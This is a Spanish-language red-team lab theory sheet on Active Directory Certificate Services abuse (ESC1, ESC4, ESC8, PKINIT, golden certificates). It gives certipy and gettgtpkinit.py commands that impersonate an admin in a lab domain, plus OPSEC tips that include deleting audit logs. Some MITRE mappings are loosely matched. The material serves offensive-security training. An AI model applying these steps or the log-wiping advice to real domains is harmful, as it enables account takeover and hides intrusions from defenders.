# Theory — ADCS Misconfigurations & Certificate Abuse

> **Lab-03 · Dark Gate**  
> Bloque CRTO: ADCS Exploitation (ESC1, ESC4, ESC8), Certificate-based Persistence

---

## 1. ADCS 101: Certificates as Keys

**Active Directory Certificate Services (ADCS)** es la PKI (Public Key Infrastructure) de AD. Emite certificados para:
- TLS/HTTPS (web)
- Smartcard authentication
- Code signing
- Email encryption

**En CRTO:** Misconfigurations permiten obtener certificados válidos para **impersonar usuarios/máquinas**.

---

## 2. ESC1: Overly Permissive Certificate Template

### ¿Qué es?

Un **Certificate Template** define quién puede solicitar certificado, para qué se usa, y qué información contiene.

**Vulnerable (ESC1):**
- EKU (Extended Key Usage) incluye "Client Authentication"
- "Subject Alternative Name" es editable (SAN)
- Template permissions permiten "Enroll" a usuarios normales

### Impacto

```
Solicitas certificado para usuario admin
→ Especificas SAN = "admin" en solicitud
→ CA lo emite (porque template lo permite)
→ Tienes certificado válido firmado por CA para usuario "admin"
→ Impersonas admin
```

### Explotación

```bash
# Enumerar templates vulnerables
certipy find -dc-ip 10.0.2.10 -u user:pass

# Buscar "Client Authentication" + "Subject Alternative Name" editable

# Solicitar certificado para admin
certipy req -ca 'DC-01\Certification Authority' -template 'vulnerable-template' \
  -upn admin@atackcorp.local -u user -p pass -dc-ip 10.0.2.10

# Convertir a PFX
openssl pkcs12 -in cert.pem -keyfile key.pem -export -out admin.pfx

# Usar para autenticación Kerberos (PKINIT)
python3 gettgtpkinit.py -cert admin.pfx -pfx-password password ATACKCORP/admin admin.ccache
```

---

## 3. ESC4: Template Permissions

### ¿Qué es?

Si tienes permisos `Write` o `ModifyPermissions` en template, puedes:
- Cambiar EKU a "Client Authentication"
- Permitir enrollment a usuarios normales
- Editar SAN

### Impacto

Template inicialmente "seguro" se vuelve explotable.

### Mitigación

Restricciones de permisos estrictas en templates.

---

## 4. ESC8: Relay to Web Enrollment

### ¿Qué es?

AD CS proporciona **Web Enrollment** (HTTP) además de LDAP (DCOM). Si Web Enrollment aceptan solicitudes sin autenticación, puedes:
- Relayd una petición de autenticación NTLM
- Obtener un certificado sin credenciales válidas

### Impacto

NTLM Relay + Web Enrollment = certificado arbitrario.

---

## 5. PKINIT: Authenticate with Certificates

### ¿Qué es?

**PKINIT (Public Key Cryptography for Initial Authentication)** permite autenticación Kerberos con certificado en lugar de contraseña.

Si tienes certificado para usuario "admin", puedes:
```
PKINIT con cert admin
→ Solicitar TGT como admin
→ Obtener TGT válido
→ Acceso a recursos como admin
```

### Herramientas

```bash
# Gettgtpkinit.py (Impacket)
python3 gettgtpkinit.py -cert admin.pfx -pfx-password password DOMAIN/admin admin.ccache

# Convertir a formato usable
export KRB5CCNAME=admin.ccache

# Ahora cualquier herramienta Kerberos te autentica como admin
```

---

## 6. Golden Certificates: Persistence

### ¿Qué es?

Una vez que comprometes la **CA private key** o tienes acceso a CA, puedes:
- Emitir certificados indefinidamente
- Certificados válidos incluso después de cambios de contraseña
- Persistencia a largo plazo (años)

### Impacto

**Máxima persistencia:** Certificado válido por años, no se invalida por cambios de contraseña.

---

## 7. Equivalencia CS ↔ Sliver

| Operación | Cobalt Strike | Sliver | Notas |
|-----------|---|---|---|
| **ADCS Enum** | Certify.exe (BOF) | `certipy find` | Sliver vía shell |
| **Cert Request** | Certify.exe request | `certipy req` | External tool |
| **PKINIT** | Rubeus.exe pkinit | `gettgtpkinit.py` | External tool, same concept |
| **Use Certificate** | TGT vía ticket | Export `KRB5CCNAME` | Same result |

---

## 8. MITRE ATT&CK Mapping

| Táctica | Técnica | ID | Lab-03 |
|---------|---------|----|----|
| Credential Access | Forge Web Credentials | T1606.002 | Certificate forgery |
| Lateral Movement | Exploitation of Trusted Relationship | T1550.003 | Use certificate for auth |
| Persistence | Create Account | T1136 | Certificate-based persistence |

---

## 9. OPSEC: ADCS Abuse

### ESC1 Exploitation
- **Riesgo:** Certificate request logs (Event 4886)
- **Mitigación:** Solicitar durante horario de trabajo (imita usuarios normales)

### PKINIT Usage
- **Riesgo:** Kerberos pre-auth con certificado es anómalo
- **Mitigación:** Certificate temporal, borrar logs de auditoría después

### Golden Certificates
- **Riesgo:** CA compromise es catastrophic
- **Mitigación:** None → detección es prioridad

---

## 10. Key Takeaways

1. **ADCS es PKI real:** Certificados son tan válidos como contraseñas.
2. **Misconfiguration = RCE:** ESC1-8 son bien conocidas, pero aún comunes.
3. **Certificates = Persistence:** Válido por años, no se invalida con cambios.
4. **Golden Certificates = Game Over:** CA compromise permite persistencia indefinida.

---

*Theory · Lab-03 Dark Gate · ADCS Exploitation*